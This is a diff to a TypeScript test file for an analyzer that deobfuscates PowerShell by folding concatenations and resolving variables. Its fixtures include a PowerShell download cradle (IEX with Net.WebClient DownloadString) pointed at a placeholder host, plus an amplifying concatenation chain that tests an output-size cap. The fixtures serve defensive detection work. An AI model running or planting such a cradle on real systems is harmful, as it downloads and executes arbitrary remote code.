@@ -1,6 +1,6 @@
 // shared/analyzer/__tests__/resolve.test.ts
 import { describe, expect, it } from 'vitest'
-import { foldConcat, resolveVars, resolve } from '../resolve'
+import { foldConcat, resolveVars, resolve, normalize } from '../resolve'
 
 describe('foldConcat', () => {
   it('collapses a chain of string-literal concatenations', () => {
@@ -53,5 +53,27 @@ describe('resolve (fixpoint)', () => {
   it('is idempotent on already-clean input', () => {
     const clean = "IEX ( New-Object Net.WebClient ) . DownloadString ( 'http://a/x' )"
     expect(resolve(clean)).toBe(resolve(resolve(clean)))
+  })
+})
+
+describe('normalize', () => {
+  it('matches resolve on input with no concat/vars (mere reformatting only)', () => {
+    // no + concat, no $var bindings — resolve should differ from the raw input
+    // only in whitespace, exactly as normalize does (the re-emit baseline).
+    const input = "IEX (New-Object Net.WebClient).DownloadString('http://a/x')"
+    expect(resolve(input)).toBe(normalize(input))
+  })
+  it('re-spaces but does not fold concatenations', () => {
+    expect(normalize("'a'+'b'")).toContain('+')
+    expect(normalize("'a'+'b'")).not.toBe(foldConcat("'a'+'b'"))
+  })
+})
+
+describe('resolve output cap', () => {
+  it('caps output size on an amplifying concat cradle', () => {
+    const base = 'A'.repeat(2048)
+    let src = `$v0 = '${base}'`
+    for (let k = 1; k <= 12; k++) src += ` ; $v${k} = $v${k - 1} + $v${k - 1}`
+    expect(resolve(src).length).toBeLessThanOrEqual(1 << 20)
   })
 })
